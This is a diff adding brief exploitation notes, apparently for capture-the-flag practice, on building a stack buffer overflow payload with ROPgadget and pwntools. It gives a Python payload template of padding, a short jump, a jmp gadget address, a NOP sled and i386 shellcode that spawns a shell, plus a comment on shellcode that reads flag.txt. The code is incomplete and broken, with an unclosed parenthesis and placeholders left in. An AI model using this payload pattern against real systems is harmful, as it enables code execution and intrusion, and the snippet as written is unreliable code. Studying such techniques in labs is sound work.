@@ -1,0 +1,14 @@
+ROPgadget --binary <file>: show all instructions based on address -> looking for jmp(esp is best)
+import pwn
+#pwn.asm(pwn.shellcraft.i386.linux.cat("flag.txt") : shellcode for cat flag.txt
+#"\xeb\x<hex num>": short jmp for num
+short_jump = b"\xeb\x08\x90\x90"
+payload = b"".join(
+  [
+    b"A" * offset,
+    short_jump,
+    <address from ROPgadget>,
+    b"\x90" * 16,
+    pwn.asm(pwn.shellcraft.i386.linux.sh(),
+    b"\n"
+  ]
